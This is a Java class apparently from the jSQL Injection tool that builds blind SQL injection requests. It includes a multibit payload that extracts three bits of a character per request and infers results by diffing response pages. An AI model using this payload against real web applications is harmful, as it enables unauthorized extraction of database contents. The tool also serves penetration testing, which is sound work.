package com.jsql.model.injection.strategy.blind;

import com.jsql.model.InjectionModel;
import com.jsql.model.injection.strategy.blind.patch.Diff;
import com.jsql.model.injection.strategy.blind.patch.DiffMatchPatch;

import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;

/**
 * Define a call HTTP to the server, require the associated url, character
 * position and bit. Opcodes represents the differences between
 * the TRUE page, and the resulting page.
 */
public class CallableMultibit extends AbstractCallableBoolean<CallableMultibit> {

    // List of differences found between the TRUE page, and the present page
    private LinkedList<Diff> opcodes = new LinkedList<>();

    private static final DiffMatchPatch DIFFMATCHPATCH = new DiffMatchPatch();

    private final InjectionMultibit injectionMultibit;

    private final InjectionModel injectionModel;
    private final String metadataInjectionProcess;

    /**
     * Constructor for preparation and blind confirmation.
     * @param sqlQuery
     * @param injectionMultibit
     */
    public CallableMultibit(String sqlQuery, InjectionModel injectionModel, InjectionMultibit injectionMultibit, AbstractInjectionBoolean.BooleanMode blindMode, String metadataInjectionProcess) {

        this.injectionModel = injectionModel;
        this.injectionMultibit = injectionMultibit;
        this.metadataInjectionProcess = metadataInjectionProcess;
//        this.booleanUrl = this.injectionModel.getMediatorVendor().getVendor().instance().sqlLengthTestBlind(sqlQuery, indexCharacter, blindMode);
        this.booleanUrl = sqlQuery;
    }

    public CallableMultibit(String sqlQuery, int indexCharacter, InjectionModel injectionModel, InjectionMultibit injectionMultibit, AbstractInjectionBoolean.BooleanMode blindMode, String metadataInjectionProcess) {
        this(sqlQuery, injectionModel, injectionMultibit, blindMode, metadataInjectionProcess);
        this.booleanUrl = this.injectionModel.getMediatorVendor().getVendor().instance().sqlLengthTestBlind(sqlQuery, indexCharacter, blindMode);
        this.isTestingLength = true;
    }

    public CallableMultibit(String sqlQuery, int indexCharacter, int block, InjectionModel injectionModel, InjectionMultibit injectionMultibit, AbstractInjectionBoolean.BooleanMode blindMode, String metadataInjectionProcess) {
        this(sqlQuery, injectionModel, injectionMultibit, blindMode, metadataInjectionProcess);
        this.block = block;
        this.currentIndex = indexCharacter;
        this.booleanUrl = "'0'|conv(mid(lpad(bin(ascii("+ sqlQuery +")),8,'0'),"+ (3*block-2) +",3),2,10)";
    }

    /**
     * Check if a result page means the SQL query is true,
     * confirm that nothing in the resulting page is also defined
     * in the pages from every FALSE SQL queries.
     * @return true if the current SQL query is true
     */
    @Override
    public boolean isTrue() {

        return false;
    }

    /**
     * Process the URL HTTP call, use function inject() from the model.
     * Build the list of differences found between TRUE and the current page.
     * @return Functional Blind Callable
     */
    @Override
    public CallableMultibit call() {
        
        String ctnt = this.injectionMultibit.callUrl(this.booleanUrl, this.metadataInjectionProcess, this);

        this.opcodes = DIFFMATCHPATCH.diffMain(this.injectionMultibit.getSourceRef(), ctnt, true);

        DIFFMATCHPATCH.diffCleanupEfficiency(this.opcodes);

        this.opcodes.removeAll(this.injectionMultibit.getDiffsRefWithMultibitIds());

        for (int i = 0; i < this.injectionMultibit.getMultibitIds().size() ; i++) {
            if (new HashSet<>(this.injectionMultibit.getMultibitIds().get(i)).containsAll(this.opcodes)) {
                this.idPage = i;
            }
        }

        return this;
    }
    
    public List<Diff> getOpcodes() {
        return this.opcodes;
    }
    public int getIdPage() {
        return this.idPage;
    }
}
